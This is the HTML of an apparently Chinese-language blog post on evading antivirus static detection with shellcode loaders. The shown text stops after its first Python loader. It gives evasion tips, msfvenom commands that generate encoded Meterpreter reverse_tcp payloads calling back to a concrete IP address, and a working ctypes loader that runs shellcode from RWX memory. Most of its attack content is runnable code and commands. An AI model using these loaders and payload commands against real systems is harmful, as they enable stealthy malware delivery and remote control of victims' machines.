<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="shellcode loadershellcode要想执行需要经历如下几个过程：  申请一块内存； 把shellcode加载到这块内存； 执行这块内存。  这过程中需要注意如下几点：  加载dll，采用动态调用的方式，可以避免IAT的hook； 不要直接申请rwx(读写执行)的内存，可先申请rw内存，后面再改为可执行，杀软对rwx的内存很敏感； 加载到内存的方法非常多，除了常见的copy和move">
<meta property="og:type" content="article">
<meta property="og:title" content="静态免杀入门">
<meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="shellcode loadershellcode要想执行需要经历如下几个过程：  申请一块内存； 把shellcode加载到这块内存； 执行这块内存。  这过程中需要注意如下几点：  加载dll，采用动态调用的方式，可以避免IAT的hook； 不要直接申请rwx(读写执行)的内存，可先申请rw内存，后面再改为可执行，杀软对rwx的内存很敏感； 加载到内存的方法非常多，除了常见的copy和move">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-12-30T07:08:06.000Z">
<meta property="article:modified_time" content="2024-12-30T07:20:12.441Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>静态免杀入门</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/ThermalPower/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&text=静态免杀入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&is_video=false&description=静态免杀入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=静态免杀入门&body=Check out this article: https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&name=静态免杀入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&t=静态免杀入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-loader"><span class="toc-number">1.</span> <span class="toc-text">shellcode loader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8F%98%E5%BC%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E5%9B%9E%E8%B0%83%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">shellcode变异加密混淆回调执行代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">python加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HEX%E5%8A%A0%E5%AF%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">HEX加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64%E6%B7%B7%E6%B7%86"><span class="toc-number">3.1.2.</span> <span class="toc-text">Base64混淆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES%E6%B7%B7%E6%B7%86"><span class="toc-number">3.1.3.</span> <span class="toc-text">AES混淆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E6%89%93%E5%8C%85%E5%99%A8%E9%80%89%E6%8B%A9-Pyinstall-Py2exe-Nuitka"><span class="toc-number">3.2.</span> <span class="toc-text">#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#py2exe"><span class="toc-number">3.2.1.</span> <span class="toc-text">py2exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nuitka"><span class="toc-number">3.2.2.</span> <span class="toc-text">Nuitka</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.3.</span> <span class="toc-text">C++加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.1.</span> <span class="toc-text">函数指针执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.3.2.</span> <span class="toc-text">动态内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-number">3.3.3.</span> <span class="toc-text">内联汇编指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E6%8C%87%E4%BB%A4"><span class="toc-number">3.3.4.</span> <span class="toc-text">伪指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.4.</span> <span class="toc-text">go加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">动态内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94C%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.4.2.</span> <span class="toc-text">内联C加载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-number">3.5.</span> <span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">3.5.0.1.</span> <span class="toc-text">分离免杀</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-%E6%96%87%E4%BB%B6%E6%A8%A1%E5%BC%8F-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9%E8%BF%87DeFender%EF%BC%88%E8%BF%87%E4%B8%8D%E4%BA%86%E7%81%AB%E7%BB%92%EF%BC%89"><span class="toc-number">3.5.1.</span> <span class="toc-text">PowerShell-文件模式-特征修改过DeFender（过不了火绒）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80%E7%BB%95%E8%BF%87"><span class="toc-number">3.6.</span> <span class="toc-text">汇编代码免杀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%85%8D%E6%9D%80%EF%BC%88%E9%9D%99%E6%80%81%EF%BC%89"><span class="toc-number">3.7.</span> <span class="toc-text">java免杀（静态）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby%E5%85%8D%E6%9D%80%EF%BC%9A"><span class="toc-number">3.8.</span> <span class="toc-text">Ruby免杀：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%EF%BC%88%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB%EF%BC%89"><span class="toc-number">3.9.</span> <span class="toc-text">无文件落地（加载器分离）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-File-%E5%B0%86shellcode%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E6%8F%90%E5%8F%96"><span class="toc-number">3.9.1.</span> <span class="toc-text">Python-File-将shellcode从文本中提取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Argv-%E5%B0%86shellcode%E4%B8%8E%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB"><span class="toc-number">3.9.2.</span> <span class="toc-text">Python-Argv-将shellcode与加载器分离</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Http-%E5%B0%86shellcode%E7%94%A8%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.9.3.</span> <span class="toc-text">Python-Http-将shellcode用远程协议加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Socket-%E5%B0%86shellcode%E9%80%9A%E8%BF%87%E7%AE%A1%E9%81%93%E4%BC%A0%E8%BE%93"><span class="toc-number">3.9.4.</span> <span class="toc-text">Python-Socket-将shellcode通过管道传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Images-%E5%B0%86shellcode%E9%9A%90%E5%86%99%E8%BF%9B%E5%9B%BE%E7%89%87%E5%86%85"><span class="toc-number">3.9.5.</span> <span class="toc-text">Python-Images-将shellcode隐写进图片内</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UUID%E8%BD%AC%E6%8D%A2shellcode%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E5%85%8D%E6%9D%80"><span class="toc-number">3.10.</span> <span class="toc-text">UUID转换shellcode写入内存免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#c-uuid%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.1.</span> <span class="toc-text">c++ uuid加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8python2%E8%84%9A%E6%9C%AC%E5%B0%86shellcode%E8%BD%AC%E6%8D%A2%E6%88%90uuid"><span class="toc-number">3.10.2.</span> <span class="toc-text">利用python2脚本将shellcode转换成uuid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python2-uuid%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.3.</span> <span class="toc-text">python2 uuid加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-mac%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.10.4.</span> <span class="toc-text">python mac内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-ipv4%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.5.</span> <span class="toc-text">python ipv4内存加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-ipv6%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.6.</span> <span class="toc-text">python ipv6内存加载器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nim-shellcode%E5%85%8D%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text">nim shellcode免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E7%A0%81%E4%BF%AE%E6%94%B9-%E2%80%93%E8%8A%B1%E6%8C%87%E4%BB%A4%E6%B7%BB%E5%8A%A0-%E2%80%94upx%E5%8A%A0%E5%A3%B3"><span class="toc-number">5.</span> <span class="toc-text">特征码修改 –花指令添加 —upx加壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall%E5%85%8D%E6%9D%80%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">syscall免杀介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%B2%99%E7%AE%B1%E6%A3%80%E6%B5%8B"><span class="toc-number">8.</span> <span class="toc-text">反沙箱检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%BC%80cs%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">9.</span> <span class="toc-text">二开cs环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">10.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81MSBuild-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.1.</span> <span class="toc-text">一、MSBuild.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81msiexec-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.2.</span> <span class="toc-text">二、msiexec.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81Mshta-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.3.</span> <span class="toc-text">三、Mshta.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81InstallUtil-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.4.</span> <span class="toc-text">四、InstallUtil.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81Rundll32-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.5.</span> <span class="toc-text">五、Rundll32.exe介绍</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        静态免杀入门
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-30T07:08:06.000Z" class="dt-published" itemprop="datePublished">2024-12-30</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h2><p>shellcode要想执行需要经历如下几个过程：</p>
<ol>
<li>申请一块内存；</li>
<li>把shellcode加载到这块内存；</li>
<li>执行这块内存。</li>
</ol>
<p>这过程中需要注意如下几点：</p>
<ol>
<li>加载dll，采用动态调用的方式，可以避免IAT的hook；</li>
<li>不要直接申请rwx(读写执行)的内存，可先申请rw内存，后面再改为可执行，杀软对rwx的内存很敏感；</li>
<li>加载到内存的方法非常多，除了常见的copy和move还有uuid这种加载既能达到加密shellcode的效果，还能直接加载到内存；</li>
<li>执行内存，还可以用回调来触发如EnumChildWindows；</li>
<li>API调用中间可以插入一些没用的代码，打乱API调用；</li>
<li>适当加一些sleep，可以过一些沙箱。</li>
</ol>
<h2 id="shellcode变异加密混淆回调执行代码"><a href="#shellcode变异加密混淆回调执行代码" class="headerlink" title="shellcode变异加密混淆回调执行代码"></a>shellcode变异加密混淆回调执行代码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCode分析-OD&amp;IDA&amp;朔源</span></span><br><span class="line">1、EXE朔源-IP及端口-杀毒分析</span><br><span class="line">2、编译修改-IP及端口-威胁感知</span><br><span class="line">reverse_tcp.asm</span><br><span class="line">https://www.cnblogs.com/Akkuman/p/12859091.html</span><br><span class="line">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCode变异-编码混淆加密算法</span></span><br><span class="line">Xor Aes Hex Rc4 Rsa等</span><br><span class="line">https://github.com/Arno0x/ShellcodeWrapper</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">1、python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor</span><br><span class="line">CS&amp;MSF</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin</span><br><span class="line">2、python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class="line">3、Hex</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c</span><br><span class="line">https://gchq.github.io/CyberChef/</span><br><span class="line">https://github.com/ByPassAVTeam/ShellcodeLoader</span><br><span class="line">LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)</span><br><span class="line">4、Rc4</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c </span><br><span class="line">https://blog.csdn.net/weixin_45590789/article/details/105536623</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</span></span><br><span class="line">Callback_Shellcode_Injection-main</span><br><span class="line">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h2><p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9385">https://xz.aliyun.com/t/9385</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p>
<h3 id="python加载器"><a href="#python加载器" class="headerlink" title="python加载器"></a>python加载器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过调用VirtualAlloc函数，申请一块动态内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),<span class="comment">#要分配的内存区域的地址</span></span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="comment">#分配的大小</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>), <span class="comment">#分配的类型</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>)) <span class="comment">#该内存的初始保护属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用RtlMoveMemory函数，函数从我们指定的内存复制内容到另一内存</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用CreateThread将在主线程的基础上创建一个新线程</span></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用WaitForSingleObject函数等待创建的线程运行结束。</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>代码不是很长，可以看到主要调用的就是ctypes这个库。</p>
